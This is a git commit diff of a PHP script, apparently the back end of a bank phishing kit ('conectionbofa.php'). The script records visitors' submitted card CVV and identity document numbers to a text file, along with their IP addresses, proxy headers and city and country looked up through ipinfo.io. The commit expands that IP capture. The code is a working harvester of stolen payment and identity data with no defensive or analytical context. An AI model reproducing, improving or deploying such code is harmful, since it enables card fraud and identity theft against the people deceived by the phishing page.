65d09843cb79402712acbeaa2997c00adca67d8d
holamundo12345new <104818999+holamundo12345new@users.noreply.github.com>
2022-05-22 11:17:49 -0500

    Update conectionbofa.php

--- conectionbofa.php
+++ conectionbofa.php
@@ -2,10 +2,15 @@
 
 date_default_timezone_set('America/Caracas');
 ini_set("display_errors", 0);
-$userp = $_SERVER['REMOTE_ADDR'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$ip_comp = $_SERVER['HTTP_CLIENT_IP'];
+$userp = $_SERVER['HTTP_X_FORWARDED'];
+$proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];
 
-$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
-$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
+
+
+$cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
+$city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));
 	
 	$file = fopen("NEW.txt", "a");
 	
@@ -21,12 +26,14 @@ fwrite($file,
 * CVV: ".$_POST['cvv']."
 * DOCU: ".$_POST['docu']."
 * N-DOCU: ".$_POST['ndocu']."
-* F-H-IP-P-C: 
-".date('Y-m-d')."
-".date('H:i:s')."
+* FECHA: ".date('Y-m-d')."
+* HORA: ".date('H:i:s')."
+* IP: ".$ip."
+* PROXY: ".$proxy."
+* IP COMPARTIDA: ".$ip_comp."
 ".$userp."
 ".$cc."
-".$city."  
+".$city."   
 " . PHP_EOL);
 fwrite($file, "==============================" . PHP_EOL);
 fclose($file);
